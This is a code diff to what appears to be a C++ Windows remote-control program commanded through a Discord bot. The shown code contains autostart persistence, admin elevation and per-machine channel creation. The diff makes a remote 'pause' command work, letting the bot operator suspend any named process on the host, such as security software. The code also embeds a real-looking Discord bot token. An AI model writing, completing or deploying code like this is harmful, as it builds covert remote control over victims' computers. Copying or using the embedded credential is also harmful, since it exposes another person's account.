@@ -23,11 +23,11 @@ std::filesystem::path temp = std::filesystem::temp_directory_path();
 
 //shit to change
 const long long int guildId = 1254187382140305408;
-const std::string BOT_TOKEN = "MTI1NDE4NzU1OTQyNTQwOTEwNQ.Gm132A.xjuAMEV_NTmhvMymh5hr5ijKZ5R1kOwGixyH7I"; // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
+const std::string BOT_TOKEN = "MTI1NDE4NzU1OTQyNTQwOTEwNQ.Gm132A.xjuAMEV_NTmhvMymh5hr5ijKZ5R1kOwGixyH7I";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
 const bool autostart = true;
 
-// creates channel at startup
-void suspend(const std::wstring& processName);
+// creates channel at startup and defines functions
+void suspend(const std::string& processName);
 void Startup();
 void getAdmin(HANDLE &hMutex);
 long long int Channelid_CreateChannel;
@@ -312,8 +312,9 @@ int main() {
     bot.on_slashcommand([](const dpp::slashcommand_t& event) {
         if (event.command.get_command_name() == "pause" && (event.command.channel_id == Channelid_CreateChannel))
         {
+            event.reply("attempting to suspend....");
             std::string processforsuspend = std::get<std::string>(event.get_parameter("process"));
-            // suspend(processforsuspend); // todo fix
+            suspend(processforsuspend);
         }
         else {
             std::cout << "not for me \n";
@@ -504,7 +505,6 @@ void Startup() {
     CoUninitialize();
 }
 
-
 void getAdmin(HANDLE &hMutex) {
         wchar_t szPath[MAX_PATH];
         if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))
@@ -523,7 +523,11 @@ void getAdmin(HANDLE &hMutex) {
         }
 }
 
-void suspend(const std::wstring& processName) {
+void suspend(const std::string& processName) {
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &processName[0], (int)processName.size(), nullptr, 0);
+    std::wstring wProcessName(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &processName[0], (int)processName.size(), &wProcessName[0], size_needed);
+
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return;
 
@@ -536,7 +540,7 @@ void suspend(const std::wstring& processName) {
     }
 
     do {
-        if (processName == pe32.szExeFile) {
+        if (wProcessName == pe32.szExeFile) {
             HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
             if (hProcess == nullptr) continue;
 
@@ -553,4 +557,3 @@ void suspend(const std::wstring& processName) {
 
     CloseHandle(hSnapshot);
 }
-
